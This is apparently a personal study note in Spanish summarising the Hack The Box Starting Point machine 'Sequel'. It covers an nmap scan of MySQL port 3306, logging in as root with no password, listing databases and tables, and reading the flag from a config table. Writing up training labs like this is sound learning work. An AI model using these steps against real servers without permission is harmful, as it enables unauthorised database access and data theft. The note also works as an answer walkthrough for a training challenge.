![[Pasted image 20260623114801.png]]![[Pasted image 20260623114841.png]]
![[Pasted image 20260623114955.png]]![[Pasted image 20260623115947.png]]![[Pasted image 20260623120020.png]]

### Resumen, Máquina "Sequel" (HTB Starting Point, Tier 1)

#### 1. Reconocimiento con Nmap

```
nmap -sV -p 3306 <IP>
nmap -sV -p 3306 --script=mysql-info <IP>
```

Encontraste el puerto 3306 abierto con MariaDB 10.3.27 corriendo. El script `mysql-info` te dio la versión exacta que el escaneo normal no detectó.

#### 2. El fallo de seguridad: root sin contraseña

El servidor MySQL tenía el usuario root sin contraseña, igual que en máquinas anteriores, un servicio expuesto sin autenticación real.

#### 3. Conectarse a MySQL

```
mysql -h <IP> -u root --skip-ssl
```

- `-h` → específica el host (IP del servidor)
- `-u` → específica el usuario
- `--skip-ssl` → necesario porque el servidor es antiguo y no soporta SSL, mientras que tu cliente moderno lo intenta usar por defecto

#### 4. Explorar las bases de datos

sql

```sql
SHOW DATABASES;     -- listar todas las bases de datos
USE htb;            -- entrar en la base de datos "htb"
SHOW TABLES;        -- listar las tablas dentro
DESCRIBE users;     -- ver la estructura de una tabla
SELECT * FROM config;   -- leer el contenido de una tabla
```

#### 5. Encontrar la flag

Explorando la base de datos `htb` encontraste las tablas `config` y `users`. La flag estaba dentro de la tabla `config`.